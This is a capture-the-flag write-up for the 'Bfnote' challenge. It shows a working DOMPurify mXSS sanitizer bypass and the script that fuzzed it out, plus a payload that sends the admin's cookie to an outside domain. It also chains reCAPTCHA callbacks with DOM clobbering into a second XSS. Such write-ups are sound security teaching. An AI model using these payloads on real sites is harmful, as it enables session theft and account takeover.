## Bfnote (320 points, 18 solves)
This was a client-side challenge, whose goal was to steal the admin's cookie. 


### DOMPurify Bypass
The application was protected by DOMPurify in version 2.0.16 which during CTF happened to have a complete bypass in Chrome. A few days ago, [Michał Bentkowski](https://twitter.com/SecurityMB) disclosed a very cool [mXSS bypass](https://twitter.com/SecurityMB/status/1306940251496230912) for the sanitizer which abused strange behaviors of `<math>` elements which initial support has been recently added to Chrome. 

The bypass was: 

```html
<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert()>
```

The [fix](https://github.com/cure53/DOMPurify/commit/ce22c8ca95675171e412b1590568cfc8065debd4#diff-39d3e4cf739c51697e855107d73a23f5R676) seemed very weak against such powerful mutation, which only removed `<math>` elements containing `<form>` children. I fuzzed other elements with the following snippet:

```js
var elms = ["a","abbr","acronym","address","area","article","aside","audio","b","bdi","bdo","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","content","data","datalist","dd","decorator","del","details","dfn","dir","div","dl","dt","element","em","fieldset","figcaption","figure","font","footer","form","h1","h2","h3","h4","h5","h6","head","header","hgroup","hr","html","i","img","input","ins","kbd","label","legend","li","main","map","mark","marquee","menu","menuitem","meter","nav","nobr","ol","optgroup","option","output","p","picture","pre","progress","q","rp","rt","ruby","s","samp","section","select","shadow","small","source","spacer","span","strike","strong","style","sub","summary","sup","table","tbody","td","template","textarea","tfoot","th","thead","time","tr","track","tt","u","ul","var","video","wbr"];

for(let el of elms){
    let p = `<form><math><mtext></form><${el}><mglyph><style><img>`;
    document.body.innerHTML = p;
    let old = document.body.innerHTML;
    document.body.innerHTML = old;
        if(document.body.innerHTML != old){
            console.log(p);
        }
}
```

and it yielded another mutation with `<table>` and which can be simplified to: 

```html
<math><mtext><table><mglyph><style><img src=x onerror=alert()>
```

This was a 0day for a split second (maybe a negative number :P), because seconds later, it was already fixed and announced in a [tweet](https://twitter.com/cure53berlin/status/1307602849455640576). 

Too bad someone has tweeted it publicly on Twitter and broke the whole challenge... 

The server restricted usage of some characters but crafting the payload was quite easy. My final payload sent to admin was:

```html
<math><mtext><table><mglyph><style><img src=x onerror=location=location.pathname+/terjanq.me/+document.cookie>
```

which leaked the cookies to my server, where also was the flag:

#### TWCTF{reCAPTCHA_Oriented_Programming_with_XSS!}


### Intended solution

By looking at the flag, it clearly was not the intended solution so I spent some time finding another way. 

The application was simulating the Brainf*ck decompiler and displayed the output to the page. However, it was protected by two mechanisms:
* before displaying it to the DOM, `<` and `>` were replaced with their HTML entity equivalents.

```js
  // no xss please
output = output.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
writeOutput();
```
* `writeOutput` function was protected by the following snippet.

```js
function writeOutput() {
  if (statusCode !== 3) {
    if (CONFIG.unsafeRender) {
      document.getElementById('output').innerHTML = output;
    } else {
      document.getElementById('output').innerText = output;
    }
  }
}
```

Not only the application had to execute properly, but also `CONFIG.unsafeRender` had to be defined, to have any chances for XSS. However, if the application exited successfully, the output would not contain `<`, `>` characters. 

Since the code was much more complicated than this, I included the whole code in the snippet [bf.js](#file-bf-js).

#### ReCAPTCHA for the rescue
There is an interesting [feature](https://developers.google.com/recaptcha/docs/display#render_param) in Google's reCAPTCHA that allows us to specify a function callback via `data-callback` attribute on `g-recaptcha` button. This, when clicked on the button, will invoke the specified callback function. From the spec, we can also notice `data-error-callback` which is explained as:

> Optional. The name of your callback function, executed when reCAPTCHA encounters an error (usually network connectivity) and cannot continue until connectivity is restored. If you specify a function here, you are responsible for informing the user that they should retry.

By providing an invalid `sitekey`, it will instantly trigger an alert via:

```html
<button class="g-recaptcha" data-sitekey="1337" data-error-callback="alert">
```

With that, we could potentially invoke the `writeOutput` function even if the program hasn't exited properly. And because of that, `output` could contain unreplaced `<` and `>` characters, because the `replaceAll` function will never be called. 

#### CONFIG clobbering
The `CONFIG.unsafeRender` check is easy to bypass with DOM Clobbering. 

I did it via:

```html
<a id=CONFIG name=unsafeRender>
<a id=CONFIG>
```

#### The solution
Although the idea for the solution was simple, the execution of it was proven to be a little harder. After the program exits with an exception, the `statusCode` is set to `3` which we need to change back to something different. It can be done in two ways:

1. By calling `initProgram` which sets it back to `0`.
2. By calling `runProgram` which sets it to `1` and then runs the program.

We can perform both steps by injecting two `reCAPTCHA` buttons:

```html
<button class="g-recaptcha" data-sitekey="1337" data-error-callback="runProgram">
<button class="g-recaptcha" data-sitekey="1337" data-error-callback="writeOutput">
```

The former method was problematic because if the program finished before `writeOutput` was invoked, the `statusCode` would once again be set to `3`. To make it work, the program would have to be slowed down by some expensive operations.


The latter looks promising but has one downside. After initiating the program, it will also invoke the below snippet, which resets the prepared CONFIG clobbering in the payload because of innerText method.

```js
  program = document.getElementById('program').innerText;
  document.getElementById('program').innerHTML = DOMPurify.sanitize(program).toString();
```

However, I managed to bypass the innerText with a trick `<<u>u>123` which after the first iteration will have `u>123` underscored, and after the second one will have `123`. This could be used to redefine clobbered properties. 

With that, I crafted the following final payload:

```html
----[---->+<]>---.--[->++<]>-.+.+++++.[->+++<]>+.-------.[->+++<]>.+[----->+<]>-.-.--.+++.--------------.+++.[++++>-----<]>.[----->++++<]>.+++++++++++.------------.-[--->+<]>-.--------.--------.+++++++++.++++++.[++>---<]>.[--->++<]>+++.-----.---------.+++++++++++.+++[->+++<]>.--[->+++<]>-.+++++++.-[--->++<]>.+++[->+++<]>.+++++++++++++.--------.---------.+++++++++++++.+++.-[->+++++<]>-.------.+[-->+++<]>-.
<<a id=CONFIG name=unsafeRender>a id=CONFIG name=unsafeRender>>
<<a id=CONFIG>a id=CONFIG>>
<button class="g-recaptcha" data-sitekey="123" data-error-callback="initProgram">
<button class="g-recaptcha" data-sitekey="1234" data-error-callback="writeOutput">

<!-- repeat to have a better chance for the correct order of calls -->
<button class="g-recaptcha" data-sitekey="1234" data-error-callback="writeOutput">
<button class="g-recaptcha" data-sitekey="1234" data-error-callback="writeOutput">
<button class="g-recaptcha" data-sitekey="1234" data-error-callback="writeOutput">
```

which when visiting the [https://bfnote.chal.ctf.westerns.tokyo/?id=e6857fd3f5d53d37](https://bfnote.chal.ctf.westerns.tokyo/?id=e6857fd3f5d53d37) URL, rewrites the document to `/terjanq/`.

The first part of the payload is just `<style/onload=document.write(/terjanq/)>` encoded in Brainf*ck.
